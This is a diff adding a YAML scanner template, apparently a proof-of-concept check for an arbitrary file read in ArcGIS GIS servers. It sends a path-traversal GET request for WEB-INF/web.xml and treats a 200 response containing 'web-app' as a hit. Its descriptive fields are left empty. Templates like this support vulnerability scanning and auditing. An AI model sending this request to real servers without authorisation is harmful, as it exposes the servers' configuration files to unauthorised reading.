@@ -1,0 +1,22 @@
+id:
+
+info:
+  name: ArcGIS 地理信息系统任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /arcgis/manager/3370/js/../WEB-INF/web.xml
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+response1:
+  body: web-app
+  code: 200
+requests2:
+response2:
